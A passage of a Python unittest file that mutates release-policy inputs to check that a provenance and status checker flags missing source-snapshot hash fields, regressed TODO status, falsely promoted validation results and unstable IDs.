                "engineering beforePack provenance contract missing 'sourceSnapshotSha256'",
                CHECKER.validate_policy(current),
            )

        current = inputs()
        current["formal_before_pack"] = str(current["formal_before_pack"]).replace(
            "LCF_SOURCE_TREE",
            "LCF_SOURCE_TR33",
        )
        expected_hashes = dict(CHECKER.EXPECTED_FORMAL_BOUNDARY_SHA256)
        expected_hashes["formal beforePack"] = hashlib.sha256(
            str(current["formal_before_pack"]).encode("utf-8")
        ).hexdigest()
        with mock.patch.object(
            CHECKER,
            "EXPECTED_FORMAL_BOUNDARY_SHA256",
            expected_hashes,
        ):
            self.assertIn(
                "formal beforePack provenance contract missing 'LCF_SOURCE_TREE'",
                CHECKER.validate_policy(current),
            )

        current = inputs()
        current["common_audit"] = str(current["common_audit"]).replace(
            "sourceSnapshotSha256",
            "sourceSnapshotShh256",
        )
        with mock.patch.object(
            CHECKER,
            "EXPECTED_COMMON_AUDIT_SHA256",
            hashlib.sha256(str(current["common_audit"]).encode("utf-8")).hexdigest(),
        ):
            self.assertIn(
                "engineering common audit provenance contract missing 'sourceSnapshotSha256'",
                CHECKER.validate_policy(current),
            )

    def test_w02_status_cannot_regress_or_promote_the_gate(self) -> None:
        current = inputs()
        changed(
            current,
            "todo",
            "| TODO-PACKAGED-SMOKE-001 | Priority-0 | W02 | `in-progress` |",
            "| TODO-PACKAGED-SMOKE-001 | Priority-0 | W02 | `planned` |",
        )
        self.assertTrue(any("W02 TODO" in error for error in CHECKER.validate_policy(current)))

        current = inputs()
        row = next(
            line
            for line in str(current["trace"]).splitlines()
            if line.startswith("| VAL-PACKAGED-SMOKE-001 |")
        )
        current["trace"] = str(current["trace"]).replace(
            row, row.replace("`not-run`", "`pass`", 1), 1
        )
        self.assertTrue(any("canonically not-run" in error for error in CHECKER.validate_policy(current)))

    def test_w02a_cannot_become_a_stable_id(self) -> None:
        current = inputs()
        current["iteration"] = str(current["iteration"]) + "\nTODO-W02A-001\n"
        self.assertTrue(any("stable ID" in error for error in CHECKER.validate_policy(current)))


if __name__ == "__main__":
    unittest.main()
